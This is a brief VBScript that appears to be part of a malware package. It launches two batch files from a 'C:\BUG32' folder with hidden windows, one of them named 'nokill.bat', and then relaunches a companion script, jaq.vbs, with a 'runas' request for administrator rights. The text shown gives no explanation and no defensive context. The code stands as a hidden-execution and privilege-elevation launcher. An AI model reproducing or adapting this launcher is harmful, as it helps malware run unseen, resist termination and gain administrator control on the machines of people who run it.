set objShell = createobject("Shell.Application")
dim buhu
 buhu="C:\bug32\jaq.vbs" 
set x = createobject("Wscript.shell")
x.run "C:\BUG32\js.bat",0
x.run "C:\BUG32\nokill.bat",0
 ObjShell.ShellExecute "wscript.exe", """" & buhu & """ RunAsAdministrator", , "runas", 1  
